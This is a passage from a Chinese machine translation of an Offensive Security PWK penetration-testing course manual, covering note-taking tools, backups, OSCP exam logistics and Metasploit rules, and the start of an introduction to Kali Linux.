<div style="position:absolute;top:34023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旨在从目标收集尽可能多的信息。</font><font style="vertical-align: inherit;">这将允许您生成一个</font></font></nobr></div>
<div style="position:absolute;top:34042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使您无法进入实验室，也可以完整报告。</font><font style="vertical-align: inherit;">有好的，详细的笔记将是</font></font></nobr></div>
<div style="position:absolute;top:34062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在实验室的后期开发阶段特别有用，因为有某些片段</font></font></nobr></div>
<div style="position:absolute;top:34081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随时可用的信息应该可以帮助您找到实验室机器之间的明确联系，等等。</font><font style="vertical-align: inherit;">一种</font></font></nobr></div>
<div style="position:absolute;top:34100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">良好的文档流程将为您节省大量时间和一些麻烦。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34135;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.6.1 设置和提示</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做好笔记的关键是能够收集尽可能多的信息并拥有它</font></font></nobr></div>
<div style="position:absolute;top:34188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易于访问。</font><font style="vertical-align: inherit;">信息量可能会随着时间的推移而变化，因此您的流程也可能会发生变化</font></font></nobr></div>
<div style="position:absolute;top:34208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速找到您需要的东西。</font></font></nobr></div>
<div style="position:absolute;top:34241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您还需要了解信息的存储位置——是本地的还是远程的？</font><font style="vertical-align: inherit;">是吗</font></font></nobr></div>
<div style="position:absolute;top:34260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加密？</font><font style="vertical-align: inherit;">您的笔记中是否有任何敏感信息？</font><font style="vertical-align: inherit;">如果是这样，请考虑可能性</font></font></nobr></div>
<div style="position:absolute;top:34280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的信息（或更糟的是，您客户的）可能会落入坏人之手。</font></font></nobr></div>
<div style="position:absolute;top:34312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们强烈建议您捕获并记录所有内容。</font><font style="vertical-align: inherit;">某些工具</font></font></nobr></div>
<div style="position:absolute;top:34331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持将其输出写入文件，其中一些甚至具有报告功能。</font><font style="vertical-align: inherit;">捕捉</font></font></nobr></div>
<div style="position:absolute;top:34351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的终端输出，然后将其与您的个人笔记相结合，有时也会有所帮助。</font></font></nobr></div>
<div style="position:absolute;top:34370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保注释、突出显示重要部分，并写下您可能认为的任何内容</font></font></nobr></div>
<div style="position:absolute;top:34390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关的。</font><font style="vertical-align: inherit;">请记住，有时屏幕截图值一千字，因此请确保您</font></font></nobr></div>
<div style="position:absolute;top:34409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">把它们也带走。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34627;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="30"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 30 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:34660;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:35737;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:35737;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">30</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:34756;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.6.2 笔记工具</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:34790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有许多笔记工具可供您选择，例如 OneNote </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11</font></font></font></nobr></div>
<div style="position:absolute;top:34810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Windows/macOS)、DayOne </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (macOS) 或 Joplin </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (MacOS/Windows/Linux) 等。您也可以选择</font></font></nobr></div>
<div style="position:absolute;top:34829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用诸如 MDwiki 之类的东西，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个基于</font><font style="vertical-align: inherit;">Markdown</font><font style="vertical-align: inherit;">的 wiki，它允许您</font><font style="vertical-align: inherit;">使用 Markdown</font><font style="vertical-align: inherit;">进行编写和</font></font></nobr></div>
<div style="position:absolute;top:34848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后在 HTML 中呈现输出。</font></font></nobr></div>
<div style="position:absolute;top:34881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论您喜欢哪种工具，收集 RAW 输出的最佳方法是设置一些</font></font></nobr></div>
<div style="position:absolute;top:34901;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日志类型并忘记它（直到需要它）。</font><font style="vertical-align: inherit;">这样输出会自动保存</font></font></nobr></div>
<div style="position:absolute;top:34920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而且您不必担心记住要返回到您的笔记。</font><font style="vertical-align: inherit;">有几种方法可以</font></font></nobr></div>
<div style="position:absolute;top:34939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示到要保存的终端的所有输出，其中一些包括：</font></font></nobr></div>
<div style="position:absolute;top:34972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:34972;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：一旦执行，所有输出（包括 bash 的颜色和退格）都保存到一个文件中，</font></font></nobr></div>
<div style="position:absolute;top:34992;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以随时重播。</font></font></nobr></div>
<div style="position:absolute;top:35026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:35026;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">terminator</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有各种功能和插件的备用终端模拟器，例如</font></font></nobr></div>
<div style="position:absolute;top:35045;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Logger（将所有输出保存到文本文件）和 TerminalShot（从</font></font></nobr></div>
<div style="position:absolute;top:35064;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端）。</font></font></nobr></div>
<div style="position:absolute;top:35099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：管道输出 (&gt;) 或使用 tee 也是一种选择，但您必须为每个</font></font></nobr></div>
<div style="position:absolute;top:35118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，所以你必须记住每次都运行它们。</font></font></nobr></div>
<div style="position:absolute;top:35151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了处理渗透测试期间收集的大量信息，我们喜欢使用</font></font></nobr></div>
<div style="position:absolute;top:35170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多用途笔记应用程序，用于初步记录我们的所有发现。</font><font style="vertical-align: inherit;">使用这样一个</font></font></nobr></div>
<div style="position:absolute;top:35190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序有助于以数字方式和精神组织数据。</font><font style="vertical-align: inherit;">一旦渗透测试</font></font></nobr></div>
<div style="position:absolute;top:35209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束了，我们可以使用临时文件来编译完整的报告。</font></font></nobr></div>
<div style="position:absolute;top:35242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只要输出是</font></font></nobr></div>
<div style="position:absolute;top:35261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清晰易读。</font><font style="vertical-align: inherit;">习惯于记录您的工作和发现。</font><font style="vertical-align: inherit;">这是唯一的专业</font></font></nobr></div>
<div style="position:absolute;top:35280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成工作的方法！</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:35315;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.8.6.3 备份</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有两种类型的人：那些定期备份他们的文档的人，以及那些</font></font></nobr></div>
<div style="position:absolute;top:35369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">希望他们这样做。</font><font style="vertical-align: inherit;">备份通常被认为是一种保险。</font><font style="vertical-align: inherit;">你永远不知道你什么时候去</font></font></nobr></div>
<div style="position:absolute;top:35388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要它，直到你做！</font><font style="vertical-align: inherit;">作为一般规则，我们建议您备份文档</font></font></nobr></div>
<div style="position:absolute;top:35407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经常。</font><font style="vertical-align: inherit;">将备份保存在安全的地方。</font><font style="vertical-align: inherit;">您当然不希望它们最终出现在公共 git 中</font></font></nobr></div>
<div style="position:absolute;top:35427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回购或云！</font></font></nobr></div>
<div style="position:absolute;top:35460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档不应该是您备份的唯一内容。</font><font style="vertical-align: inherit;">确保备份重要文件</font></font></nobr></div>
<div style="position:absolute;top:35479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的 Kali VM 上，根据需要拍摄适当的快照，依此类推。</font><font style="vertical-align: inherit;">一边犯错总是最好的</font></font></nobr></div>
<div style="position:absolute;top:35498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谨慎。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:35627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(OneNote, 2019), https://www.onenote.com</font></font></font></nobr></div>
<div style="position:absolute;top:35647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（2019 年第一天），http://dayoneapp.com</font></font></font></nobr></div>
<div style="position:absolute;top:35667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(laurent22, 2019), https://github.com/laurent22/joplin</font></font></font></nobr></div>
<div style="position:absolute;top:35687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MDwiki，2019），http://dynalon.github.io/mdwiki/#!index.md</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:35944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9 关于 OSCP 考试</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSCP 认证考试模拟包含少量数字的私有 VPN 中的实时网络</font></font></nobr></div>
<div style="position:absolute;top:36005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受攻击的机器。</font><font style="vertical-align: inherit;">要通过，您必须获得 70 分。</font><font style="vertical-align: inherit;">积分可用于限制访问</font></font></nobr></div>
<div style="position:absolute;top:36024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及完整的系统妥协。</font><font style="vertical-align: inherit;">环境完全为您服务</font></font></nobr></div>
<div style="position:absolute;top:36044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考试持续时间，您将有 23 小时 45 分钟的时间来完成它。</font></font></nobr></div>
<div style="position:absolute;top:36076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个目标机器的具体说明将位于您的考试控制面板中，它将</font></font></nobr></div>
<div style="position:absolute;top:36095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只有在考试开始后才能使用。</font><font style="vertical-align: inherit;">您的考试包，其中将包含一个 VPN</font></font></nobr></div>
<div style="position:absolute;top:36115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接包和附加说明，将包含您可以用来访问的唯一 URL</font></font></nobr></div>
<div style="position:absolute;top:36134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的考试控制面板。</font></font></nobr></div>
<div style="position:absolute;top:36167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为确保我们认证的完整性，考试将由远程监考。</font><font style="vertical-align: inherit;">你需要</font></font></nobr></div>
<div style="position:absolute;top:36186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在考试开始时间前 15 分钟到场以进行身份​​验证和其他预</font></font></nobr></div>
<div style="position:absolute;top:36206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考试任务。</font><font style="vertical-align: inherit;">在安排考试之前，</font><font style="vertical-align: inherit;">请务必阅读我们的监考常见问题解答</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:36239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考试结束后，您将有额外的 24 小时来整理您的考试报告</font></font></nobr></div>
<div style="position:absolute;top:36258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并记录您的发现。</font><font style="vertical-align: inherit;">您将根据考试报告的质量和内容接受评估，</font></font></nobr></div>
<div style="position:absolute;top:36277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所以请包含尽可能多的细节，并确保您的发现都是可重复的。</font></font></nobr></div>
<div style="position:absolute;top:36310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另请注意，接受您的考试提交是一个手动过程，因此可能需要</font></font></nobr></div>
<div style="position:absolute;top:36329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您收到我们正式通知我们已收到您的文件之前的一段时间。</font></font></nobr></div>
<div style="position:absolute;top:36362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦您的考试文件被接受，您的考试将被评分，您将收到您的成绩</font></font></nobr></div>
<div style="position:absolute;top:36382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10 个工作日内。</font><font style="vertical-align: inherit;">如果您达到及格分数，我们会要求您确认您的身体状况</font></font></nobr></div>
<div style="position:absolute;top:36401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址，以便我们可以邮寄您的证书。</font><font style="vertical-align: inherit;">如果您做不到，那么我们会通知您，您可以</font></font></nobr></div>
<div style="position:absolute;top:36420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用适当的链接购买认证重考。</font></font></nobr></div>
<div style="position:absolute;top:36453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们强烈建议您在 36 小时的时间内仔细安排考试时间</font></font></nobr></div>
<div style="position:absolute;top:36472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保没有外界干扰或承诺。</font><font style="vertical-align: inherit;">另外，请注意考试的可用性是处理</font></font></nobr></div>
<div style="position:absolute;top:36492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遵循先到先得的原则，因此最好尽可能提前安排考试</font></font></nobr></div>
<div style="position:absolute;top:36511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以确保您的首选日期可用。</font><font style="vertical-align: inherit;">有关考试的更多信息，我们</font></font></nobr></div>
<div style="position:absolute;top:36531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鼓励您花一些时间阅读 OSCP 考试指南。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:36565;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9.1 Metasploit 使用 - 实验室与考试</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们鼓励您在实验室中使用 Metasploit。</font><font style="vertical-align: inherit;">Metasploit 是一个很棒的工具，你应该学习所有</font></font></nobr></div>
<div style="position:absolute;top:36622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它必须提供的功能。</font><font style="vertical-align: inherit;">虽然 Metasploit 的使用在 OSCP 认证考试中受到限制，但我们</font></font></nobr></div>
<div style="position:absolute;top:36641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将鼓励您在学习过程中不要对自己施加任意限制。</font><font style="vertical-align: inherit;">更多的</font></font></nobr></div>
<div style="position:absolute;top:36661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关 Metasploit 使用的信息可以在 OSCP 考试指南中找到。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:36698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.10 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们讨论了充分利用 PWK 课程所需的重要信息</font></font></nobr></div>
<div style="position:absolute;top:36759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和实验室。</font><font style="vertical-align: inherit;">此外，我们还介绍了报告撰写的基础知识以及如何参加最终的 OSCP</font></font></nobr></div>
<div style="position:absolute;top:36779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考试。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:36855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://www.offensive-security.com/faq/#exam-proc</font></font></font></nobr></div>
<div style="position:absolute;top:36875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://support.offensive-security.com/oscp-exam-guide/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们祝您在 PWK 之旅中好运，并希望您享受即将到来的新挑战</font></font></nobr></div>
<div style="position:absolute;top:37151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脸。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:38314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.10.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:38340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 熟悉 Kali Linux</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 由 Offensive Security 开发、资助和维护。</font><font style="vertical-align: inherit;">它是一个基于 Debian 的 Linux</font></font></nobr></div>
<div style="position:absolute;top:38404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分发旨在高级渗透测试和安全审计。</font><font style="vertical-align: inherit;">Kali 包含几个</font></font></nobr></div>
<div style="position:absolute;top:38423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数百个面向各种信息安全任务的工具，例如渗透</font></font></nobr></div>
<div style="position:absolute;top:38443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试、安全研究、计算机取证和逆向工程。</font></font></nobr></div>
<div style="position:absolute;top:38475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与操作系统一起打包的所有程序都经过了适用性和</font></font></nobr></div>
<div style="position:absolute;top:38494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">效力。</font><font style="vertical-align: inherit;">它们包括用于网络渗透测试的 Metasploit、用于端口的 Nmap 和</font></font></nobr></div>
<div style="position:absolute;top:38514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描，Wireshark 用于监控网络流量，Aircrack-ng 用于测试</font></font></nobr></div>
<div style="position:absolute;top:38533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无线网络的安全性仅举几例。</font></font></nobr></div>
<div style="position:absolute;top:38566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块的目标是为所有技能水平的用户提供一个基线并为即将到来的</font></font></nobr></div>
<div style="position:absolute;top:38585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块。</font><font style="vertical-align: inherit;">我们将为新用户探索提示和技巧，并审查一些标准</font></font></nobr></div>
<div style="position:absolute;top:38605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级用户可能会欣赏。</font><font style="vertical-align: inherit;">无论技能水平如何，我们都推荐适当水平的</font></font></nobr></div>
<div style="position:absolute;top:38624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专注于这个模块。</font><font style="vertical-align: inherit;">正如传闻亚伯拉罕林肯所说的那样，“给我六个小时来砍</font></font></nobr></div>
<div style="position:absolute;top:38643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从树上下来，我会用前四个来磨斧头”。</font></font></nobr></div>
<div style="position:absolute;top:38676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，鼓励所有技能水平的用户查看 Kali 上的免费在线培训</font></font></nobr></div>
<div style="position:absolute;top:38696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">培训现场。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该站点包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux Revealed</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一书，练习旨在测试您的</font></font></nobr></div>
<div style="position:absolute;top:38715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">理解、专门的支持论坛等。</font><font style="vertical-align: inherit;">这些免费资源提供了宝贵的见解</font></font></nobr></div>
<div style="position:absolute;top:38734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于所有技能水平的用户，并作为本教程中提供的培训的绝佳伴侣</font></font></nobr></div>
<div style="position:absolute;top:38754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">课程。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
